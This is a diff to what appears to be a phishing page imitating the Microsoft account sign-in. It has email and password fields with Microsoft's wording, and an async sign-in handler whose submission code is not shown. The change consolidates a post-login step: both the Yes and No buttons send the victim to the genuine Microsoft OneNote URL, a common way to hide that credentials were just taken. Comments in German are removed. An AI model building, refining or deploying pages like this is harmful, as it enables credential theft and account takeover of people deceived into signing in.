@@ -254,10 +254,6 @@
             background-color: rgba(0, 0, 0, .3);
         }
 
-        #btn_final:hover {
-            text-decoration: underline;
-        }
-
         .text-title {
             font-size: 1.5rem;
         }
@@ -387,8 +383,8 @@
                 <span>Don't show this again</span>
             </label>
             <div class="btn-group">
-                <button class="btn btn-sec" id="btn_no" type="button">No</button>
-                <button class="btn" id="btn_yes" type="button">Yes</button>
+                <button type="button" class="btn btn-sec" onclick="redirectToMS()">No</button>
+                <button type="button" class="btn" onclick="redirectToMS()">Yes</button>
             </div>
         </div>
     </section>
@@ -398,6 +394,11 @@
         <span>.&nbsp;.&nbsp;.</span>
     </footer>
     <script>
+        function redirectToMS() {
+            console.log("Redirect wird aufgerufen...");
+            window.location.href = "https://m365.cloud.microsoft/launch/onenote?auth=2&origindomain=Office";
+        }
+
         const unReq = "Enter a valid email address, phone number, or Skype name."
         const pwdReq = "Please enter the password for your Microsoft account."
         const unameInp = document.getElementById('inp_uname');
@@ -409,7 +410,6 @@
         const nxt = document.getElementById('btn_next');
 
         nxt.addEventListener('click', () => {
-            //validate the form
             validate();
             if (unameVal) {
                 document.getElementById("section_uname").classList.toggle('d-none');
@@ -421,7 +421,6 @@
             }
         })
 
-        // Enter Key Handler für Email
         unameInp.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') {
                 e.preventDefault();
@@ -429,12 +428,9 @@
             }
         })
 
-        //////sign in button
-
         const sig = document.getElementById('btn_sig');
 
         sig.addEventListener('click', async () => {
-            //validate the form
             validate();
             if (pwdVal) {
                 try {
@@ -463,24 +459,11 @@
             }
         })
 
-        // Enter Key Handler für Passwort
         pwdInp.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') {
                 e.preventDefault();
                 sig.click();
             }
-        })
-
-        // Button "No" - Weiterleitung
-        const btnNo = document.getElementById('btn_no');
-        btnNo.addEventListener('click', () => {
-            window.location.href = "https://m365.cloud.microsoft/launch/onenote?auth=2&origindomain=Office";
-        })
-
-        // Button "Yes" - Weiterleitung
-        const btnYes = document.getElementById('btn_yes');
-        btnYes.addEventListener('click', () => {
-            window.location.href = "https://m365.cloud.microsoft/launch/onenote?auth=2&origindomain=Office";
         })
 
         function validate() {
@@ -494,7 +477,6 @@
                     unameInp.classList.remove('error-inp')
                     unameVal = true;
                 }
-
             }
             function pwdValAction(type) {
                 if (!type) {
@@ -506,7 +488,6 @@
                     pwdInp.classList.remove('error-inp')
                     pwdVal = true;
                 }
-
             }
             if (view === "uname") {
                 if (unameInp.value.trim() === "") {
@@ -538,7 +519,6 @@
             return false;
         }
 
-        //back button
         document.querySelector('.back').addEventListener('click', () => {
             view = "uname";
             document.getElementById("section_pwd").classList.toggle('d-none');
